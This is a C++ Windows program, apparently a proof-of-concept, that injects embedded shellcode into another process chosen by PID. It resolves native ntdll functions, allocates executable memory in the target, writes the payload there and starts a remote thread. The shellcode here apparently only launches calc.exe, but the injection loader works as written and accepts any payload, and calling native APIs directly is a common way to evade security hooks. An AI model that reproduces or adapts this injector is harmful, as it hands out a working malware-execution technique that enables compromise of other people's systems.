#include "ntapi.hpp"
#include <libloaderapi.h>
#include <minwinbase.h>
#include <ntdef.h>
#include <ntstatus.h>
#include <stdexcept>
#include <synchapi.h>
#include <windows.h>
#include <winnt.h>

constexpr void populatePrototypes() {}

int main(int argc, char *argv[]) {
  const unsigned char shellcode[] =
      "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
      "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
      "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
      "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
      "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
      "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
      "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
      "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
      "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
      "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
      "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
      "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
      "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
      "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
      "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
      "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
      "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
      "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
      "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
      "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

  if (argc != 2)
    throw std::runtime_error("Incorrect number of arguments");

  HMODULE ntdllHandle = LoadLibraryA("ntdll");
  if (ntdllHandle == NULL)
    throw std::runtime_error("Couldn't get handle to ntdll module");

  populatePrototype(NtOpenProcess, ntdllHandle);
  populatePrototype(NtAllocateVirtualMemory, ntdllHandle);
  populatePrototype(NtWriteVirtualMemory, ntdllHandle);
  populatePrototype(NtCreateThreadEx, ntdllHandle);
  populatePrototype(NtClose, ntdllHandle);

  HANDLE processHandle = NULL;
  NTSTATUS status{};
  OBJECT_ATTRIBUTES objectAttrs = {sizeof(objectAttrs), NULL};
  DWORD PID = std::stoul(argv[1]);
  CLIENT_ID clientId = {.UniqueProcess = (HANDLE)PID, .UniqueThread = NULL};
  status = NtOpenProcessF(&processHandle, PROCESS_ALL_ACCESS, &objectAttrs,
                          &clientId);
  if (status != STATUS_SUCCESS)
    throw std::runtime_error("Failed to get handle to process, with error: " +
                             std::to_string(status));

  SIZE_T regionSize = sizeof(shellcode);
  PVOID buf = NULL;
  status = NtAllocateVirtualMemoryF(processHandle, &buf, 0, &regionSize,
                                    MEM_RESERVE | MEM_COMMIT,
                                    PAGE_EXECUTE_READWRITE);
  if (status != STATUS_SUCCESS) {
    NtCloseF(processHandle);
    throw std::runtime_error(
        "Failed to allocate memory in process, with error: " +
        std::to_string(status));
  }

  status = NtWriteVirtualMemoryF(processHandle, buf, (void *)&shellcode,
                                 sizeof(shellcode), NULL);
  if (status != STATUS_SUCCESS) {
    NtCloseF(processHandle);
    throw std::runtime_error(
        "Failed to write to memory in process, with error: " +
        std::to_string(status));
  }

  HANDLE threadHandle = NULL;
  status = NtCreateThreadExF(&threadHandle, THREAD_ALL_ACCESS, &objectAttrs,
                             processHandle, buf, NULL, 0, 0, 0, 0, NULL);
  if (status != STATUS_SUCCESS) {
    NtCloseF(processHandle);
    throw std::runtime_error(
        "Failed to create thread in process, with error: " +
        std::to_string(status));
  }

  WaitForSingleObject(threadHandle, INFINITE);

  NtCloseF(threadHandle);
  NtCloseF(processHandle);
}
